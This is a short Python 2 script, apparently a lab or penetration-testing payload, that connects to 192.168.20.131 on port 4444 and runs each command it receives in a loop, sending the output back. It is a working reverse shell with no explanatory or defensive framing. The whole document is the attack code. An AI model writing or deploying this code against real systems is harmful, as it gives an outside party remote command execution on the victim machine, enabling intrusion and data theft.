import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect(('192.168.20.131',4444))
Lv=False
while not Lv:
	data=so.recv(1024)
	if len(data)==0:
		Lv=True
	stdin,stdout,stderr,=os.popen3(data)
	stdout_value=stdout.read()+stderr.read()
	so.send(stdout_value)
